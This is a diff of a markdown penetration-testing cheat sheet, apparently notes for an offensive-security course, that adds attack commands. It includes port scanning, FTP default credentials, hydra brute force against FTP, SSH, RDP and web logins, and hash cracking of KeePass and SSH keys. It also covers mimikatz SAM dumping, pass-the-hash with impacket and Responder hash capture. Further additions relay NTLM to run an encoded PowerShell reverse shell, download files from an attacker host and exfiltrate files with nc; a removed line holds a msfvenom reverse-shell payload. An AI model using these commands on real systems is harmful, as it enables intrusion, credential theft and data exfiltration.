@@ -4,13 +4,13 @@
 
 Reveal open ports:
 ```
-sudo masscan -p1-65535,U:1-65535 $ip --rate=1000 -e tun0
+sudo masscan -p1-65535,U:1-65535 $rhost --rate=1000 -e tun0
 ```
 Then, use these ports with nmap `-sC` option
 ## nmap
 
 ```
-nmap ...
+nmap -p21,22,80,139,443,445,... -sC -sV -A -T4 $rhost
 ```
 # Enumeration
 
@@ -19,7 +19,7 @@ nmap ...
 ### ftp
 
 ```
-nmap -p21 --script=ftp-vuln* -A -T4 -sV $ip
+nmap -p21 --script=ftp-vuln* -A -T4 -sV $rhost
 ```
 
 Some credentials to tries:
@@ -28,12 +28,30 @@ admin:admin
 user:admin
 machinename:machinename
 anonymous:anonymous
+ftp:ftp
+```
+Anonymous login:
+```
+ftp $rhosts
+>anonymous
+>anonymous
+>ls -a # List all files (even hidden) (yes, they could be hidden)
+>binary #Set transmission to binary instead of ascii
+>ascii #Set transmission to ascii instead of binary
+>bye #exit
 ```
 
 Bruteforce login attack:
 ```
-hydra -L usersfile -P /path/to/passwordfile ftp://$ip [-s $port]
+hydra -L usersfile -P /path/to/passwordfile ftp://$rhosts [-s $rport]
 ```
+
+Download all files from ftp:
+```
+wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
+wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all
+```
+
 ### smb
 
 Enumeration via enum4linux:
@@ -982,35 +1000,209 @@ Cross compile:
 ```
 i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
 ```
-NOTE: There as an error and then, the option `-lws2_32` was added in order to compile it.
+NOTE: There was an error with the example and then, the option `-lws2_32` was added in order to compile it.
 
 For a 64-bit application:
 ```
 x86_64-w64-mingw32-gcc file.c -o file.exe
 ```
 
-Generate the payload:
-```
-msfvenom -p windows/shell_reverse_tcp LHOST=$your_ip LPORT=$lport EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
-```
 ## Antivirus Evasion
-Check with the PEN200 course.
 
 ## Password Attack
 
+Which hash it is?
+```
+hashid file.hash
+```
+
+Find the `-m` flag for hashcat
+```
+hashcat -h | grep -i "hash_name"
+```
+
+### Attacking Network Services Logins
+
+#### SSH and RDP
+Password brute force:
+```
+sudo hydra -l username -P /path/to/wordlist -s $rport ssh://$rhost
+```
+
+User brute force:
+```
+sudo hydra -L namelist -P "p@ssw0rd" -s $rport rdp://$rhost
+```
+
+HTTP POST:
+
+Get your data via burp and use here!
+```
+sudo hydra -l username -P /path/to/wordlist $rhosts http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"
+```
+#### Wordlists
+
+For passwords:
+```
+/wordlist/rockyou.txt
+/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
+/usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt
+```
+
+For userlist:
+```
+/dirb/common/names.txt
+/seclists/Usernames/Names/names.txt
+/seclists/Usernames/top-usernames-shortlist.txt
+```
+
 ### Mutating Lists
+[hashcat Rule-based Attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
+
+Create a file with `$1` which is append 1 to the wordlist
+```
+echo \$1 > demo.rule
+```
+
+The result is that the first character of each password is capitalized AND a “1” is appended to each password:
+```
+cat demo1.rule
+$1 c
+```
+
+In this case, each rule is used separately, resulting in two mutated passwords for every password from the wordlist
+```
+cat demo2.rule
+$1
+c
+```
+
+Path for hashcat rules:
+```
+/usr/share/hashcat/rules/
+```
 
 ### Password Manager
 
+Find kdbx databases:
+```
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+Extract the hash from the database:
+```
+keepass2john Database.kdbx > keepass.hash
+```
+NOTE! Remember to alter the hash file and delete everything before $keepass$...
+
+Crack it with hashcat
+```
+hashcat -m 13400 keepass.hash
+/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --
+force
+```
+
+Use this password with the GUI KeePass and extract the passwords from it.
+
 ### SSH Private Key Passphrase
 
+Change permissions for the ssh private key (400 or 600):
+```
+chmod 400 id_rsa
+```
+
+Extract the hash with ssh2john:
+```
+ssh2john id_rsa > ssh.hash
+```
+
+Crack it with hashcat:
+```
+hashcat -m 22921 ssh.hash /path/to/wordlist -r ssh.rule -- force
+```
+
+JtR new rule
+```
+cat ssh.rule
+[List.Rules:sshRules]
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+```
+
+Add this rule to file john.conf
+```
+sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >>
+/etc/john/john.conf'
+```
+
+With john:
+```
+john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+```
+
 ### Cracking NTLM
+Windows stores hashed user passwords in the Security Account Manager (SAM) database file, which is used to authenticate local or remote users.
+
+Extracting with mimikatz (needs to be local administrator)
+```
+privilege::debug
+token::elevate
+lsadump::sam
+```
+
+Cracking with hashcat:
+```
+hashcat -m 1000 file.hash /path/to/wordlist -r /path/to/rule --force
+```
 
 ### Passing NTLM (Pass the Hash)
 
+With smbclient so we can access some shares:
+```
+smbclient \\\\$rhosts\\share -U username --pw-nt-hash ntlm_hash
+```
+
+With impacket-psexec or wmiexec. At the end of the command we could specify another argument, which is used to determine which command psexec should execute on the target system. If we leave it empty, `cmd.exe` will be executed, providing us with an interactive shell:
+```
+impacket-psexec -hashes 00000000000000000000000000000000:ntlm_hash username@$rhosts
+```
+
+```
+impacket-wmiexec -hashes 00000000000000000000000000000000:ntlm_hash username@$rhosts
+```
+
 ### Cracking Net-NTLMv2
+If we’ve obtained code execution on a remote system, we can easily force it to authenticate with us by commanding it to connect to our prepared SMB server.
+
+Setting up Responder on local machine:
+```
+sudo responder -I tun0
+```
+
+Send a dir/ls command to your ip address so Responder can get the Net-NTLMv2 hash:
+```
+dir \\$lhost\something
+```
+
+Cracking it with hashcat:
+```
+hashcat -m 5600 file.hash /path/to/wordlist --force
+```
 
 ### Relaying Net-NTLMv2
+
+In kali machine, let's set the ntlmrelayx from impacket:
+```
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t server_need_access -c "powershell -enc base64(reverse_shell)"
+```
+
+From the windows machine that we have access as an unprivilege user, we send a dir/ls command to your ip:
+```
+dir \\$lhost\something
+```
+
+With this, impacket will try to relay our hash to other machine with ip is `server_need_access`.
 
 ## Client Side Attack
 
@@ -1044,10 +1236,85 @@ Check with the PEN200 course.
 
 ### Automated
 
-## linux
+## Linux
 
-### Manual
+### Basic
 
 ### Automated
+Using linPEAS
+
+### Exposed Confidential Information
+
+### Insecure File Permissions
+
+#### CronJobs
+
+```
+cat /etc/crontab
+```
+
+Add pspy!
+#### Password Authentication
+
+### Insecure System Components
+
+#### Setuid Binaries and Capabilities
+
+#### Kernel Exploits
 
 # Metasploit
+
+# Exfiltration Data
+
+## Windows
+
+CMD
+```
+certutil -urlcache -split -f http://$lhost:$lport/file.ext file.ext
+```
+
+Powershell
+```
+iwr -uri http://$lhost:$lport/file.ext -OutFile file.ext
+(New-Object Net.WebClient).DownloadFile("http://$lhost:$lport/file.ext","C:\path\to\file.ext")
+Invoke-WebRequest "http://$lhost:$lport/file.ext" -OutFile "file.ext"
+```
+
+## Linux
+
+```
+wget http://$lhost:$lport/file.ext
+curl http://$lhost:$lport/file.ext -o /path/to/file.ext
+```
+
+### SCP
+
+Credits:
+[How to Use SCP Command for File Transfer](https://www.hostinger.com/tutorials/using-scp-command-to-transfer-files/#:~:text=SCP%20(secure%20copy%20protocol)%20is,for%20your%20data%20and%20credentials.)
+
+Copying from a local server to a remote host and can use `-r` to copy multiple files or subdirectories:
+```
+scp -P [-r] 2222 /users/Hostinger/desktop/scp.zip root@191.162.0.2:/writing/article
+```
+
+Transferring a Remote File to a Local Machine
+```
+scp root@191.162.0.2:/writing/articles/SCP.zip Users/Hostinger/Desktop
+```
+
+Safely Moving a File Between Remote Hosts
+```
+scp root@191.162.0.2:/writing/article/scp.zip hostinger@11.10.0.1:/publishing
+```
+
+### NC
+```
+nc -lvnp 4444 > new_file
+nc -vn <IP> 4444 < exfil_file
+```
+### SMB
+
+Via set a smbserver impacket-smbserver:
+```
+impacket-smbserver -smb2support sharename /path/to/share
+```
